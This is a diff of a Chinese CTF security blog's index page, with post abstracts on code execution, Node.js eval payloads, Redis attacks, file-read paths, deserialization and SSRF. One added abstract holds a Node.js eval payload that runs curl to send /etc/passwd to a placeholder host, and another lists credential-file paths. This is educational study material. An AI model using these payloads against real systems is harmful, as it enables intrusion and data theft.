@@ -355,6 +355,236 @@
     
     
     <article class="index-post">
+        <a class="abstract-title" href = "/2021/04/23/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%B0%8F%E6%80%BB%E7%BB%93/" >
+            
+                <span>代码执行小总结</span>
+        </a>
+        <div class="abstract-content">
+            代码执行漏洞形成原因：客户端提交的参数，未经任何过滤，传入可以执行代码的函数，造成代码执行漏洞。常见代码注射函数：如：eval、preg_replace+/e、assert、call_user_func、call_user_func_array、create_function等函数漏洞危害：执行代码，写入webshell、控制服务器
+示例代码：
+12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: 羽# @Date:   2020-09-05 20:31:22# @Last Modif...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/04/23</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "代码执行">代码执行</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2021/04/20/nodejs%E5%88%A9%E7%94%A8%E5%B0%8F%E6%80%BB%E7%BB%93/" >
+            
+                <span>nodejs利用小总结</span>
+        </a>
+        <div class="abstract-content">
+            参考链接：Node.js 常见漏洞学习与总结
+eval导致的命令执行常见payload弹计算器(windows)：
+1/eval?q=require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);
+读取文件(linux)：
+12/eval?q=require(&#x27;child_process&#x27;).exec(&#x27;curl -F &quot;x=`cat /etc/passwd`&quot; http://vps&#x27;);;curl -F参数用于传输二进制文件
+反弹shell(linux)：
+12345/ev...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/04/20</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "nodejs">nodejs</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2021/04/19/redis%E6%94%BB%E9%98%B2%E5%88%A9%E7%94%A8%E9%9D%A2%E6%80%BB%E7%BB%93/" >
+            
+                <span>redis攻防利用面总结</span>
+        </a>
+        <div class="abstract-content">
+            本文原链接：浅析Linux下Redis的攻击面,本文只做攻击面记录，搭建请看菜鸟教程或者上述文章
+redis3.2.0前无密码登录且暴露6379redis为了方便，在3.2.0版本前无密码登录且对外暴露6379
+12341.docker run --name redis -p6379:6379 -d redis:3.0 2.redis-cli x.x.x.123 3.config get requirepass# docker部署默认都是以redis权限执行的。
+
+Tips：3.2.0之后虽然增加了保护模式只允许本地访问，但是还是默认无密码
+
+redis信息泄露info命令泄露服务器信息...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/04/19</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "渗透测试">渗透测试</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "redis攻防">redis攻防</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2021/04/17/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%B8%B8%E8%A7%81%E8%AF%BB%E5%8F%96%E8%B7%AF%E5%BE%84-NU1L%E7%9A%84%E4%B9%A6/" >
+            
+                <span>文件读取漏洞常见读取路径(NU1L的书)</span>
+        </a>
+        <div class="abstract-content">
+            Linux
+/etc/*应用或配置文件目录
+
+/etc/passwd用户信息及其工作目录
+
+/etc/shadow用户信息及密码hash
+
+/etc/apache2/*apache配置文件
+
+/etc/nginx/*nginx配置文件，ubuntu等系统
+
+/etc/apparmor(.d)/*Apparmor的配置文件，可以获知各应用系统调用的白名单、黑名单。例如可查看Mysql是否禁用了系统调用，从而决定是否可以使用UDF（User Defined Functions）
+
+/etc/environment环境变量配置文件之一，可能存在大量目录信息的泄露，甚至出现secret key
+...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/04/17</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "文件读取漏洞">文件读取漏洞</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2021/04/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96getshell-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/" >
+            
+                <span>文件上传反序列化getshell-[强网杯 2019]Upload</span>
+        </a>
+        <div class="abstract-content">
+            [强网杯 2019]Upload考点
+图片马
+php反序列化利用
+
+描述上来是一个登录框注册一个账号然后发现一个上传文件的地方,初步猜测这是一个文件上传getshell的点
+解题思路通过爆破发现源码在www.tar.gz,同时发现cookie的user字段有点奇怪base64解码后发现是一段序列化后的字符串那么先在文件夹找cookie字符串,发现进行了反序列化同时在Register.php发现了__destruct函数，此处调用了checker的index方法可以结合Profile.php的__get和__call函数利用(__get用于访问不存在或不可访问的属性，__call用于调用不...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/04/13</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "PHP反序列化">PHP反序列化</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "文件上传漏洞">文件上传漏洞</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2021/04/09/%E8%AF%BB%E5%8F%96%E5%8F%98%E9%87%8Fgetflag-BJDCTF2020-EzPHP/" >
+            
+                <span>读取变量getflag-[BJDCTF2020]EzPHP</span>
+        </a>
+        <div class="abstract-content">
+            考点
+sha1绕过
+$SERVER绕过
+php伪协议
+$REQUEST绕过
+create_function注入源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phphighlight_file(__FILE__);error_reporting(0); $file = &quot;1nD3x.php&quot;;$shana = $_GET[&#x27;shana&#x27;];$passwd = $_GET[&#x27;passwd&#...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/04/09</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "PHP伪协议">PHP伪协议</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "create_function注入">create_function注入</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href = "/2021/04/08/sql%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E9%80%9F%E6%9F%A5/" >
             
                 <span>sql绕过过滤速查</span>
@@ -694,234 +924,6 @@ PCRE回溯次数限制pcre.backtrack_limit给pcre设定了一个回溯次数上�
             <div class= abstract-tags >
     
         <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/12/21/%E4%B8%AD%E7%9A%84%E4%B8%8B%E5%88%92%E7%BA%BF%E7%BB%95%E8%BF%87-%E5%B0%8F%E7%AC%94%E8%AE%B0/" >
-            
-                <span>$_GET中的下划线绕过(小笔记)</span>
-        </a>
-        <div class="abstract-content">
-            直接上b.u.p.t=b_u_p_tb%20u%20p%20t=b_u_p_t
-文章https://www.freebuf.com/articles/web/213359.html
-
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/12/21</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/12/19/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0shell%E5%B0%8F%E6%80%BB%E7%BB%93/" >
-            
-                <span>无字母数字构造shell小总结</span>
-        </a>
-        <div class="abstract-content">
-            本文参考p牛和其他大牛的文章，稍作补充，读起来更顺畅反正没有人读我的博客，自娱自乐一下
-问题当遇到这样的问题的时候怎么样构造shell绕过限制
-123if(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$_GET[&#x27;shell&#x27;])) &#123;  eval($_GET[&#x27;shell&#x27;]);&#125;
-过滤了数字和大小写字母，这时候就需要一点奇巧淫技
-PHP5 和 PHP7中assert的区别
-PHP5中assert可以动态调用，PHP7中不可以，但是PHP7.0.12前实际上还是可以的
-PHP5,不支持($a)()...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/12/19</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "无参数构造payload">无参数构造payload</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/12/12/%E5%88%A9%E7%94%A8phar%E6%8B%93%E5%B1%95%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E9%9D%A2%E4%BE%8B%E9%A2%98/" >
-            
-                <span>利用phar拓展反序列化攻击面例题</span>
-        </a>
-        <div class="abstract-content">
-            前置知识利用 phar 拓展 php 反序列化漏洞攻击面
-phar绕过
-compress.bzip2://phar://test.phar/test.txt
-compress.zlib://phar://test.phar/test.txt
-php://filter/resource=phar://test.phar/test.txt
-
-phar协议可以直接读取gzip和bzip2压缩的phar文件
-These archives can fully compressed in gzip or bzip2 format and still be executed by the Phar e...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/12/12</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "phar反序列化">phar反序列化</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/12/08/pickle%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-jwt-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun/" >
-            
-                <span>pickle远程代码执行+jwt+逻辑漏洞[CISCN2019 华北赛区 Day1 Web2]ikun</span>
-        </a>
-        <div class="abstract-content">
-            [CISCN2019 华北赛区 Day1 Web2]ikun好家伙，我直接好家伙，这题出的不错，学到了，记录一下
-python脚本找lv6.png上来就是给kunkun应援，热血起来了回归正题，源代码提示要我们找到lv6.png同时主页有翻页功能，url为**shop?page=**那就写一个python脚本逐页找lv6.png
-123456import requestsfor i in range(200):    url=&#x27;http://70a35b89-8044-4dd2-8a10-f6c98daa9a70.node3.buuoj.cn/shop?page=&#x27;+...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/12/08</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "jwt">jwt</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "pickle">pickle</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "逻辑漏洞">逻辑漏洞</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "2019CISCN">2019CISCN</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/" >
-            
-                <span>unicode等价替换</span>
-        </a>
-        <div class="abstract-content">
-            前置知识Unicode设计的安全性Unicode等价性浅谈
-Unicode等价替换标准等价和兼容等价Unicode分为标准等价和兼容等价
-
-标准等价是指保持视觉上和功能上的等价。例如字符‘ü’和由‘u’及 ‘¨’所组成的序列是标准等价
-
-兼容等价更着重于单个字符，也就是我们下面要用到的unicode替换，如𝑓经过NFKC转换后兼容等价于f
-
-
-
-四种转换形式
-利用方式有时候防御方会ban掉敏感字符，这时候就可以利用unicode字符欺骗的方式绕过字符过滤
-由于不同的脚本语言提供了不同的转换方式，因此不同的脚本语言有不同的绕过方式
-
-python使用NFKC的转换方式
-https://s...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/11/17</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "编码漏洞">编码漏洞</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/" >
-            
-                <span>浅析SSRF漏洞</span>
-        </a>
-        <div class="abstract-content">
-            0x01 SSRF漏洞介绍SSRF(Server Side Request Forgery，服务端请求伪造)，是攻击者通过构造数据进而伪造服务器端发请求的漏洞。形成的原因多是服务器端提供了从外部服务可以获取数据的功能，但是对发起请求的来源进行验证过滤，导致攻击者可以自由构造参数，获取预期外的请求。
-SSRF原理解析URL结构如下
-1URI &#x3D; schema:[&#x2F;&#x2F;authority]path[?query][#fragment]
-
-
-userinfo 通常用于身份验证，root:passwd，以@结尾
-host就是经常说的主机名，如baidu.com
-por...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/11/16</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "SSRF">SSRF</a>
     
 </div>
             
@@ -3067,9 +3069,133 @@ por...
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 124
+        Total : 130
         </div>
         <!-- search  -->
         
@@ -3089,7 +3215,37 @@ por...
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/01</span><a class="archive-post-title" href= "/2021/11/01/javaweb%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-sql%E6%B3%A8%E5%85%A5/" >javaweb漏洞学习(sql注入)</a>
+            <span class="archive-post-date">11/09</span><a class="archive-post-title" href= "/2021/11/09/open-basedir%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/" >open_basedir方法总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2021/11/06/javaweb%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-xss/" >javaweb代码审计学习(xss)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2021/11/05/php%E5%87%A0%E9%81%93%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%98%E5%B0%8F%E6%80%BB%E7%BB%93/" >php几道随机数题小总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2021/11/05/%E5%BC%BA%E7%BD%91%E6%9D%AF%E6%8B%9F%E6%80%81easy-filter%E8%A7%A3%E6%9E%90/" >强网杯拟态easy filter解析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2021/11/05/vscode%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95php%E5%BA%95%E5%B1%82%E4%BB%A3%E7%A0%81/" >vscode远程调试php底层代码</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href= "/2021/11/02/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93/" >文件包含漏洞小总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/01</span><a class="archive-post-title" href= "/2021/11/01/javaweb%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-sql%E6%B3%A8%E5%85%A5/" >javaweb代码审计学习(sql注入)</a>
         </li>
     
     
@@ -3725,19 +3881,9 @@ por...
     
         <span class="sidebar-tag-name" data-tags="sql"><span class="iconfont-archer">&#xe606;</span>sql</span>
     
-        <span class="sidebar-tag-name" data-tags="PHP反序列化"><span class="iconfont-archer">&#xe606;</span>PHP反序列化</span>
-    
         <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
     
-        <span class="sidebar-tag-name" data-tags="2021红明谷"><span class="iconfont-archer">&#xe606;</span>2021红明谷</span>
-    
-        <span class="sidebar-tag-name" data-tags="输入法取证"><span class="iconfont-archer">&#xe606;</span>输入法取证</span>
-    
-        <span class="sidebar-tag-name" data-tags="盲水印隐写"><span class="iconfont-archer">&#xe606;</span>盲水印隐写</span>
-    
-        <span class="sidebar-tag-name" data-tags="哈夫曼编码"><span class="iconfont-archer">&#xe606;</span>哈夫曼编码</span>
-    
-        <span class="sidebar-tag-name" data-tags="流量分析"><span class="iconfont-archer">&#xe606;</span>流量分析</span>
+        <span class="sidebar-tag-name" data-tags="PHP反序列化"><span class="iconfont-archer">&#xe606;</span>PHP反序列化</span>
     
         <span class="sidebar-tag-name" data-tags="2020CISCN"><span class="iconfont-archer">&#xe606;</span>2020CISCN</span>
     
@@ -3753,25 +3899,35 @@ por...
     
         <span class="sidebar-tag-name" data-tags="Android"><span class="iconfont-archer">&#xe606;</span>Android</span>
     
-        <span class="sidebar-tag-name" data-tags="png结构"><span class="iconfont-archer">&#xe606;</span>png结构</span>
+        <span class="sidebar-tag-name" data-tags="2021红明谷"><span class="iconfont-archer">&#xe606;</span>2021红明谷</span>
     
-        <span class="sidebar-tag-name" data-tags="CRC32"><span class="iconfont-archer">&#xe606;</span>CRC32</span>
+        <span class="sidebar-tag-name" data-tags="输入法取证"><span class="iconfont-archer">&#xe606;</span>输入法取证</span>
+    
+        <span class="sidebar-tag-name" data-tags="盲水印隐写"><span class="iconfont-archer">&#xe606;</span>盲水印隐写</span>
+    
+        <span class="sidebar-tag-name" data-tags="哈夫曼编码"><span class="iconfont-archer">&#xe606;</span>哈夫曼编码</span>
+    
+        <span class="sidebar-tag-name" data-tags="流量分析"><span class="iconfont-archer">&#xe606;</span>流量分析</span>
     
         <span class="sidebar-tag-name" data-tags="md5"><span class="iconfont-archer">&#xe606;</span>md5</span>
     
         <span class="sidebar-tag-name" data-tags="shtml"><span class="iconfont-archer">&#xe606;</span>shtml</span>
     
+        <span class="sidebar-tag-name" data-tags="png结构"><span class="iconfont-archer">&#xe606;</span>png结构</span>
+    
+        <span class="sidebar-tag-name" data-tags="CRC32"><span class="iconfont-archer">&#xe606;</span>CRC32</span>
+    
+        <span class="sidebar-tag-name" data-tags="intro"><span class="iconfont-archer">&#xe606;</span>intro</span>
+    
         <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
     
         <span class="sidebar-tag-name" data-tags="CVE"><span class="iconfont-archer">&#xe606;</span>CVE</span>
     
-        <span class="sidebar-tag-name" data-tags="intro"><span class="iconfont-archer">&#xe606;</span>intro</span>
-    
         <span class="sidebar-tag-name" data-tags="Hash"><span class="iconfont-archer">&#xe606;</span>Hash</span>
     
-        <span class="sidebar-tag-name" data-tags="php_upload_progress_session"><span class="iconfont-archer">&#xe606;</span>php_upload_progress_session</span>
-    
         <span class="sidebar-tag-name" data-tags="hash长度拓展攻击"><span class="iconfont-archer">&#xe606;</span>hash长度拓展攻击</span>
+    
+        <span class="sidebar-tag-name" data-tags="php_upload_progress_session"><span class="iconfont-archer">&#xe606;</span>php_upload_progress_session</span>
     
         <span class="sidebar-tag-name" data-tags="Java安全"><span class="iconfont-archer">&#xe606;</span>Java安全</span>
     
@@ -3807,15 +3963,15 @@ por...
     
         <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
-        <span class="sidebar-tag-name" data-tags="JAJA"><span class="iconfont-archer">&#xe606;</span>JAJA</span>
-    
         <span class="sidebar-tag-name" data-tags="XML"><span class="iconfont-archer">&#xe606;</span>XML</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
     
-        <span class="sidebar-tag-name" data-tags="XXE"><span class="iconfont-archer">&#xe606;</span>XXE</span>
+        <span class="sidebar-tag-name" data-tags="JAJA"><span class="iconfont-archer">&#xe606;</span>JAJA</span>
     
         <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
+    
+        <span class="sidebar-tag-name" data-tags="XXE"><span class="iconfont-archer">&#xe606;</span>XXE</span>
     
         <span class="sidebar-tag-name" data-tags="编码漏洞"><span class="iconfont-archer">&#xe606;</span>编码漏洞</span>
     
@@ -3829,11 +3985,13 @@ por...
     
         <span class="sidebar-tag-name" data-tags="横向移动"><span class="iconfont-archer">&#xe606;</span>横向移动</span>
     
+        <span class="sidebar-tag-name" data-tags="漏洞利用"><span class="iconfont-archer">&#xe606;</span>漏洞利用</span>
+    
         <span class="sidebar-tag-name" data-tags="metasploit"><span class="iconfont-archer">&#xe606;</span>metasploit</span>
     
         <span class="sidebar-tag-name" data-tags="信息收集"><span class="iconfont-archer">&#xe606;</span>信息收集</span>
     
-        <span class="sidebar-tag-name" data-tags="漏洞利用"><span class="iconfont-archer">&#xe606;</span>漏洞利用</span>
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
         <span class="sidebar-tag-name" data-tags="PHP伪协议"><span class="iconfont-archer">&#xe606;</span>PHP伪协议</span>
     
@@ -3841,35 +3999,35 @@ por...
     
         <span class="sidebar-tag-name" data-tags="pickle"><span class="iconfont-archer">&#xe606;</span>pickle</span>
     
-        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
-    
         <span class="sidebar-tag-name" data-tags="逻辑漏洞"><span class="iconfont-archer">&#xe606;</span>逻辑漏洞</span>
     
         <span class="sidebar-tag-name" data-tags="2019CISCN"><span class="iconfont-archer">&#xe606;</span>2019CISCN</span>
     
-        <span class="sidebar-tag-name" data-tags="多线程"><span class="iconfont-archer">&#xe606;</span>多线程</span>
-    
         <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
     
-        <span class="sidebar-tag-name" data-tags="redis攻防"><span class="iconfont-archer">&#xe606;</span>redis攻防</span>
+        <span class="sidebar-tag-name" data-tags="多线程"><span class="iconfont-archer">&#xe606;</span>多线程</span>
     
         <span class="sidebar-tag-name" data-tags="misc图像处理"><span class="iconfont-archer">&#xe606;</span>misc图像处理</span>
     
+        <span class="sidebar-tag-name" data-tags="redis攻防"><span class="iconfont-archer">&#xe606;</span>redis攻防</span>
+    
         <span class="sidebar-tag-name" data-tags="提权"><span class="iconfont-archer">&#xe606;</span>提权</span>
+    
+        <span class="sidebar-tag-name" data-tags="C"><span class="iconfont-archer">&#xe606;</span>C</span>
     
         <span class="sidebar-tag-name" data-tags="代码执行"><span class="iconfont-archer">&#xe606;</span>代码执行</span>
     
         <span class="sidebar-tag-name" data-tags="渗透"><span class="iconfont-archer">&#xe606;</span>渗透</span>
     
-        <span class="sidebar-tag-name" data-tags="bugs"><span class="iconfont-archer">&#xe606;</span>bugs</span>
-    
         <span class="sidebar-tag-name" data-tags="phar反序列化"><span class="iconfont-archer">&#xe606;</span>phar反序列化</span>
+    
+        <span class="sidebar-tag-name" data-tags="bugs"><span class="iconfont-archer">&#xe606;</span>bugs</span>
     
         <span class="sidebar-tag-name" data-tags="变量覆盖漏洞"><span class="iconfont-archer">&#xe606;</span>变量覆盖漏洞</span>
     
-        <span class="sidebar-tag-name" data-tags="弱类型比较"><span class="iconfont-archer">&#xe606;</span>弱类型比较</span>
-    
         <span class="sidebar-tag-name" data-tags="扫描软件"><span class="iconfont-archer">&#xe606;</span>扫描软件</span>
+    
+        <span class="sidebar-tag-name" data-tags="弱类型比较"><span class="iconfont-archer">&#xe606;</span>弱类型比较</span>
     
         <span class="sidebar-tag-name" data-tags="Django"><span class="iconfont-archer">&#xe606;</span>Django</span>
     
@@ -3880,6 +4038,8 @@ por...
         <span class="sidebar-tag-name" data-tags="文件上传漏洞"><span class="iconfont-archer">&#xe606;</span>文件上传漏洞</span>
     
         <span class="sidebar-tag-name" data-tags="文件读取漏洞"><span class="iconfont-archer">&#xe606;</span>文件读取漏洞</span>
+    
+        <span class="sidebar-tag-name" data-tags="文件包含"><span class="iconfont-archer">&#xe606;</span>文件包含</span>
     
         <span class="sidebar-tag-name" data-tags="无参数构造payload"><span class="iconfont-archer">&#xe606;</span>无参数构造payload</span>
     
